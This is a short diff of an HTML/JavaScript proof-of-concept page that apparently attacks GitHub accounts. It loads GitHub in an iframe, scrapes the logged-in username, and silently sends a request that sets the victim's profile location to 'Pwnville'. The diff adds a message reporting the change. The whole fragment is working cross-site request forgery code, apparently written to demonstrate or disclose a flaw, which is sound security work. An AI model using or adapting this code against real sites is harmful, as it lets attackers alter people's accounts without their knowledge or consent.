@@ -6,6 +6,10 @@ Your logged-in username is
 <span id="scrapedname" style="color:red; font-weight:bold" >n/a</span>
 </p>
 
+<p>
+<span id="pwnreport"></span>
+</p>
+
 <hr/>
 
 <iframe width=100% height=80% id="inner" src="http://github.com/site/privacy"></iframe>
@@ -27,6 +31,7 @@ function frameLoaded() {
      data:"field=profile_location&value=Pwnville",
      url:userUrl
    });
+   $('#pwnreport').text("Your profile 'location' has been set to 'Pwnville'");
 }
 
 $(function() {
